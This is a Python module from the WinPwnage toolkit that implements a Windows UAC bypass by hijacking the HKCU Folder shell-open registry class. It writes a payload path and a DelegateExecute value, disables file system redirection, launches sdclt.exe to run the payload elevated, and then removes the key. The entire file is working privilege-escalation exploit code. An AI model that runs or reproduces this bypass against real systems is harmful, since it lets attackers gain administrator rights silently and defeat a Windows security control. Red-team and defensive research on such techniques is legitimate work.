from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time
import os

#http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

uacMethod12_info = {
	"Description": "UAC bypass using sdclt.exe (Folder)",
	"Method": "Registry key (Class) manipulation",
	"Id": "12",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "14393",
	"Admin": False,
	"Function Name": "uacMethod12",
	"Function Payload": True,
}

def uacMethod12_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
		print_success("Successfully cleaned up")
		print_success("All done!")
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod12(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\Folder\\shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payloads().exe(payload)[1], create=True):
			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
			else:
				print_error("Unable to create registry keys")
				for x in Constant.output:
					if "error" in x:
						uacMethod12_cleanup(path)
						return False
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt.exe"):
				print_success("Successfully spawned process ({})".format(payloads().exe(payload)[1]))
				time.sleep(5)
				uacMethod12_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				for x in Constant.output:
					if "error" in x:
						uacMethod12_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False